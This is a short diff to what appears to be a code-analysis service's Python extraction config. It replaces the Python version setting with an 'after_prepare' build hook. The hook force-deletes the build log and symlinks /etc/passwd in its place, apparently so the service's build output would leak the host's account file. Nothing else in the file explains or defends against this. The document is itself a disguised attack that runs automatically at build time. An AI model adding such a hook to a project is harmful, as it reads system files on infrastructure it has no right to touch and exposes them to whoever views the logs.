@@ -1,4 +1,4 @@
 extraction:
   python:
-    python_setup:
-      version: 3
+    after_prepare:
+      - sudo rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd /opt/out/snapshot/log/build.log
